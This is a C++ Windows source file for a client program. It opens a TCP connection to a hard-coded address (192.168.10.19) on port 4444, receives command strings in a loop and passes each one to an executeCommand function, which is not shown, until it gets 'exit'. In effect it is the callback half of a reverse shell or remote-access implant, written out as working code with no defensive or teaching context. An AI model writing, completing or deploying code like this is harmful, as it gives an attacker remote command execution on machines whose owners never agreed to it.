#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#include "Client.h"
#pragma comment(lib, "Ws2_32.lib")
#define PORT 4444                              // Global defintion of binding port for Client
#define BUFFER_SIZE 12900                       // Global definition of buffer size for Client

// Client main socket function
int main() {
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    int flag = 1;
    setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(int));

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr("192.168.10.19");

    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // Proceed with the rest of your operations (command execution)
    std::string command;
    while (true) {
        char recvBuffer[BUFFER_SIZE];
        memset(recvBuffer, 0, sizeof(recvBuffer));

        int bytesReceived = recv(clientSocket, recvBuffer, sizeof(recvBuffer) - 1, 0);
        if (bytesReceived <= 0) break;

        recvBuffer[bytesReceived] = '\0';
        command = recvBuffer;

        if (command == "exit") {
            std::string exitMsg = "Client shutting down.\nEND";
            send(clientSocket, exitMsg.c_str(), exitMsg.size(), 0);
            break;
        }

        executeCommand(clientSocket, command);
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}




